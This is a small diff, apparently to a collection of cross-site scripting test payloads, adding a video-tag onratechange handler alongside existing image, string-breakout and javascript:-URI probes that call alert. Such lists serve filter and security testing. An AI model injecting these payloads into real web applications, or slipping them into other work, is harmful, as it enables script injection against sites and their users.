@@ -11,6 +11,10 @@ tags:
 
 <IMG SRC=# onmouseover="alert('xxs')">
 
+<video src onratechange="alert(1)">
+
+
+
 ";alert('XSS');//
 
 <video poster=javascript:alert(1)//></video>
